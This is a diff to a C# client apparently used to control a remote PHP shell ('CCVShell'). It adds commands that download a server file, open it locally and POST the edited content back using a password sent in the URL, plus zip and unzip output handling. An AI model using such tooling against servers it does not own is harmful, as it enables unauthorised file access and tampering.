@@ -7,6 +7,7 @@ using RestSharp;
 using Newtonsoft.Json;
 using System.IO;
 using System.Net;
+using System.Diagnostics;
 
 namespace CCVShell
 {
@@ -208,7 +209,7 @@ namespace CCVShell
 
             var response = client.Execute(request);
 
-            if (response.StatusCode == System.Net.HttpStatusCode.OK)
+            if (response.StatusCode == HttpStatusCode.OK)
             {
                 try
                 {
@@ -223,6 +224,53 @@ namespace CCVShell
                     {
                         var result = JsonConvert.DeserializeObject<Entities.pwd>(response.Content);
                         Alert.AlertUser(Alert.AlertType.Normal, result.cd);
+                    }
+                    else if (seperations[0] == "edit")
+                    {
+                        if (seperations.Length > 1)
+                        {
+                            var remote_filename = seperations[1];
+
+                            if (!Directory.Exists("temp\\"))
+                                Directory.CreateDirectory("temp\\");
+
+                            var filename = ("temp\\" + remote_filename + ".txt");
+                            File.Create(filename).Close();
+
+                            File.WriteAllText(filename, response.Content);
+
+                            Alert.AlertUser(Alert.AlertType.Normal, "Received bytes from \"" + remote_filename + "\"");
+
+                            var p = new Process();
+                            p.StartInfo.FileName = filename;
+                            p.EnableRaisingEvents = true;
+                            Alert.AlertUser(Alert.AlertType.Normal, "\"" + remote_filename + "\" started editing process...");
+                            p.Start();
+
+                            do { } while (!p.HasExited);
+
+                            var content = File.ReadAllText(filename);
+                            var cl = new RestClient(endpoint);
+                            var uri = "CCVShell/Handle.php?p=" + password + "&cmd=edit";
+
+                            var req = new RestRequest(uri, Method.POST);
+                            req.AddParameter("content", content);
+                            req.AddParameter("filename", remote_filename);
+
+                            var resp = cl.Execute(req);
+
+                            Alert.AlertUser(Alert.AlertType.Information, resp.Content);                            
+                        }
+                    }
+                    else if(seperations[0] == "zip")
+                    {
+                        if (seperations.Length == 3 || seperations.Length == 4)
+                            Console.WriteLine(response.Content);
+                    }
+                    else if (seperations[0] == "unzip")
+                    {
+                        if (seperations.Length == 3)
+                            Console.WriteLine(response.Content);
                     }
                     else if (seperations[0] == "search")
                     {
@@ -485,7 +533,7 @@ namespace CCVShell
                     }
 
                 }
-                catch (Exception) { Console.WriteLine(response.Content); }
+                catch (IOException) { Console.WriteLine(response.Content); }
 
                 return true;
             }
